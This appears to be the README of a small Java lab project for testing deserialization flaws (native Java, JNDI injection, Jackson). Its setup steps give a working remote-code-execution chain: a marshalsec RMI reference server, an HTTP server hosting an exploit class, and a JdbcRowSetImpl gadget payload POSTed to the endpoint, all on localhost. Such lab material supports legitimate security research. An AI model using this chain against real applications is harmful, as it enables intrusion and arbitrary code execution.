# Simple Deserialization tester (simple-deser)
 
## Description
This project contains some simple deserialization tests.

## Contents
1. Native Binary Java Deserialization (base64 encoded)
2. JNDI Injection
3. Jackson Deserialization + JNDI Injection

### JNDI Injection Setup
1. Run Marshalsec: `java.exe -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://<http server host>:8181#<fully qualified exploit path> <RMI server port>` (Ex: `http://localhost:8181#com.devsec.research.exploits.Exploit 2099`)
2. Start HTTP Server inside the build/classes folder at the com folder level: python -m http.server 8181
3. POST `["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://localhost:2099/Exploit","autoCommit":true}]` to /simple-deser/json